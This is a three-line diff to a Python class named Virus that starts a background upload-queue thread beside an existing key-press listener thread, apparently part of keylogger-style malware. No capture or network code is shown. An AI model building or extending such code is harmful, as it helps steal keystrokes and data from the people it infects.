@@ -50,3 +50,4 @@ class Virus(object):
     
     def init_components(self):
         threading.Thread(target=self._last_press_listener, daemon=True).start()
+        threading.Thread(target=self._upload_queue_handler, daemon=True).start()
